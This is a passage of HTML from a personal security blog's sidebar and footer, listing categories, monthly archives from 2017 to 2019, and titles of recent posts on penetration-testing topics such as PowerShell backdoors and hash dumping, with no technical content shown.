class="category-list-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/">威胁情报</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82%E9%A1%B9/">杂项</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%A0%91%E8%8E%93%E6%B4%BE/">树莓派</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/">科学上网</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E4%BB%B6/">网件</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%AB%99%E5%AE%89%E5%85%A8/">网站安全</a></li></ul>
    </div>
  </div>


  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">April 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/10/">October 2017</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2019/08/30/e5-88-a9-e7-94-a8powershell-e9-9a-90-e8-97-8f-e6-89-a7-e8-a1-8c-e5-90-8e-e9-97-a8/">利用powershell隐藏执行后门</a>
          </li>
        
          <li>
            <a href="/2019/08/24/e5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-ef-bc-9acs-e4-bb-a3-e7-90-86proxychainsnmap-e8-bf-9b-e8-a1-8c-e5-86-85-e7-bd-91-e6-89-ab-e6-8f-8f/">内网渗透：CS代理+proxychains+nmap进行内网扫描</a>
          </li>
        
          <li>
            <a href="/2019/08/24/msfcobaltstrike-e8-81-94-e5-8a-a8-e4-ba-8c-ef-bc-9a-e6-8a-8acs-e4-b8-ad-e7-9a-84-e6-9c-ba-e5-99-a8spwan-e7-bb-99msf/">msf+cobaltstrike联动(二)：把cs中的机器spwan给msf</a>
          </li>
        
          <li>
            <a href="/2019/08/24/msfcobaltstrike-e8-81-94-e5-8a-a8-e4-b8-80-ef-bc-9a-e6-8a-8amsf-e7-9a-84session-e5-8f-91-e7-bb-99cobaltstrike/">msf+cobaltstrike联动(一)：把msf的session发给cobaltstrike</a>
          </li>
        
          <li>
            <a href="/2019/08/15/windows-e4-b8-8bhash-e6-8a-93-e5-8f-96-e7-9a-84-e5-87-a0-e7-a7-8d-e6-96-b9-e5-bc-8f/">windows下hash抓取的几种方式</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2019 rich4rd<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>